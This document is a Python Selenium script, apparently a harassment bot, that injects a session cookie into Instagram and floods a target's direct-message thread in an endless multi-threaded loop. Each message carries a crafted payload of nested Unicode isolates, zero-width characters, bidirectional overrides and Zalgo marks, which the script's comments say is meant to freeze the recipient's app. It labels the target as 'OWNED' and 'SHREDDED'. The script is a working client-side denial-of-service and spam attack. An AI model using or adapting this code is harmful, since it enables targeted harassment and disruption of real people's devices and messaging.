# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER NC (DOM-SHREDDER EDITION)
# 📅 STATUS: 256-LAYER RECURSION | LAYOUT THRASHER | 10 AGENTS

import os, time, random, threading, sys, gc, tempfile, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

# --- CONFIG ---
THREADS = 2
SESSION_LIMIT = 180 
MACHINE_ID = os.getenv("MACHINE_ID", "1")

def get_dom_shredder_payload(target_name):
    """The DOM-Shredder: Max Layout Thrashing & Recursion."""
    # Branding Header
    header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR: {target_name.upper()} HAS BEEN OWNED\n"
    
    # 💥 THE 'RECURSION VOID' (256 Nested Isolates)
    # Pushes Chromium/WebKit engines into software-rendering mode.
    void = "\u2066\u2067\u2068" * 85 
    
    # 💥 THE 'CLOG' SEQUENCE (4,500 Buffer Chars)
    # ZWJ/ZWNJ/BOM mix to break rendering cache.
    clog = "\u200D\u200C\uFEFF" * 1500 
    
    # 💥 THE 'DIRECTIONAL OVERLOAD' (Direction Flip-Flopping)
    thrash = "\u202E\u202D\u200F\u200E" * 50
    
    # 💥 THE 'VERTICAL STRETCH' (Triple Zalgo Stack)
    skyscraper = "̸" * 40 + "̰" * 40 + "̵" * 40
    
    lines = [header, void, clog]
    for i in range(45):
        style = thrash if i % 2 == 0 else thrash[::-1]
        lines.append(f"{style} {target_name.upper()}_SHREDDED {skyscraper}")
    
    return "\n".join(lines)[:9850]

def log_status(agent_id, msg):
    print(f"[M{MACHINE_ID}-A{agent_id}] {msg}", flush=True)

def get_driver(agent_id):
    chrome_options = Options()
    chrome_options.add_argument("--headless=new")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1920,1080")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36")
    
    temp_dir = os.path.join(tempfile.gettempdir(), f"shredder_{MACHINE_ID}_{agent_id}")
    chrome_options.add_argument(f"--user-data-dir={temp_dir}")
    return webdriver.Chrome(options=chrome_options)

def run_life_cycle(agent_id, cookie, target_id, target_name):
    while True:
        driver = None
        try:
            log_status(agent_id, "🚀 DEPLOYING SHREDDER AGENT...")
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie, 'path': '/', 'domain': '.instagram.com'})
            driver.refresh()
            time.sleep(5)
            driver.get(f"https://www.instagram.com/direct/t/{target_id}/")
            time.sleep(12)

            session_start = time.time()
            while (time.time() - session_start) < SESSION_LIMIT:
                try:
                    box = driver.find_element(By.XPATH, "//div[@role='textbox'] | //textarea")
                    
                    # 🔥 STAGGERED BURST: 3 Ultra-Heavy Impact Messages
                    for _ in range(3):
                        payload = get_dom_shredder_payload(target_name)
                        driver.execute_script("""
                            var el = arguments[0];
                            document.execCommand('insertText', false, arguments[1]);
                            el.dispatchEvent(new Event('input', { bubbles: true }));
                        """, box, payload)
                        box.send_keys(Keys.ENTER)
                        time.sleep(0.4) 
                    
                    log_status(agent_id, f"💀 IMPACT DELIVERED | {target_name.upper()} FROZEN")
                    time.sleep(random.uniform(15, 20)) 
                    
                except:
                    time.sleep(5)
                    break 
        except Exception: pass
        finally:
            if driver: driver.quit()
            gc.collect()
            time.sleep(3)

def main():
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    target_name = os.environ.get("TARGET_NAME", "Target").strip()
    if not cookie or not target_id: sys.exit(1)
    
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for i in range(THREADS):
            executor.submit(run_life_cycle, i+1, cookie, target_id, target_name)

if __name__ == "__main__":
    main()
